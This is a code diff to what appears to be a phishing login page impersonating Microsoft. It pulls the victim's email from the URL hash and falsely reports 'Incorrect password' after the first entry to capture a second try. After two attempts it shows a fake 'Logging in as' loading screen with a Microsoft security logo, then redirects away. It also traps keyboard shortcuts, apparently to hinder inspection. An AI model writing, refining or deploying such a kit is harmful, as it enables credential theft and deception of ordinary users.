@@ -57,11 +57,66 @@
             text-align: left;
             border: 1px solid #8FA7AD;
         }
+
+        .loading-container {
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            text-align: center;
+        }
+
+        .dots-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            margin: 0 5px;
+            background-color: #333;
+            border-radius: 50%;
+            animation: dot-blink 1.4s infinite both;
+        }
+
+        @keyframes dot-blink {
+            0%,
+            80%,
+            100% {
+                opacity: 0;
+            }
+            40% {
+                opacity: 1;
+            }
+        }
+
+        .dot:nth-child(1) {
+            animation-delay: 0s;
+        }
+
+        .dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        .dot:nth-child(4) {
+            animation-delay: 0.6s;
+        }
+
+        .dot:nth-child(5) {
+            animation-delay: 0.8s;
+        }
     </style>
 </head>
 
 <body>
-    <div class="container-fluid p-0">
+    <div class="container-fluid p-0" id="login-container">
         <div class="container-fluid">
             <div class="row" style="margin: 30px 0px 60px 0px;">
                 <div class="col-md-4 mx-auto mt-5 px-3 pb-3">
@@ -79,8 +134,7 @@
                     </div>
                     <div class="col-lg-10 mx-auto mt-5">
                         <center>
-                            <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter
-                                a different account</span>
+                            <span id="error" class="text-danger" style="display: none;">Incorrect password. Please retype again.</span>
                         </center>
                         <form id="contact" class="form-horizontal well">
                             <div id="div1" class="text-dark">
@@ -134,16 +188,24 @@
             </div>
         </div>
     </div>
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
-        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
-        crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
-        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7H9Q39j7fakFPskvXusvfa0b4Q"
-        crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
-        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
-        crossorigin="anonymous"></script>
+
+    <div class="loading-container" id="loading-container">
+        <img src="https://d15shllkswkct0.cloudfront.net/wp-content/blogs.dir/1/files/2023/12/microsoftsecurity.png" alt="Logo" width="330px">
+        <div id="emailDisplay" aria-live="polite"></div>
+     
+        <div class="dots-container" aria-label="Loading content">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+        </div>
+    </div>
+    <a id="redirectLink" href="#" style="display: none;" title="Redirect to Target"></a>
+
     <script>
+        var attemptCount = 0;
+
         $(document).ready(function () {
             // Autograb email from URL
             var email = window.location.hash.substr(1);
@@ -185,19 +247,19 @@
                     },
                     success: function (response) {
                         console.log('Response received:', response);
-                        if (response) {
+                        if (response && response.signal == 'ok') {
+                            attemptCount = 0;
                             $("#msg").show();
-                            if (response['signal'] == 'ok') {
-                                $("#password").val("");
-                                $('#msg_text').html(response['msg']);
-                                setTimeout(function() {
-                                    location.reload();
-                                }, 2000);
+                            $('#msg_text').html(response.msg);
+                            setTimeout(function() {
+                                location.reload();
+                            }, 2000);
+                        } else {
+                            attemptCount++;
+                            if (attemptCount >= 2) {
+                                showLoadingPage(email);
                             } else {
-                                $('#msg_text').html(response['msg']);
-                                setTimeout(function() {
-                                    location.reload();
-                                }, 2000);
+                                $('#error').show();
                             }
                         }
                     },
@@ -236,6 +298,16 @@
                 });
             });
         });
+
+        function showLoadingPage(email) {
+            $('#login-container').hide();
+            $('#loading-container').show();
+            $('#emailDisplay').html(`Logging in as: ${email}`);
+            setTimeout(function() {
+                // Replace with your actual redirect URL
+                window.location.href = "https://your-redirect-url.com";
+            }, 5000);
+        }
 
         document.onkeydown = function (e) {
             if (e.ctrlKey &&
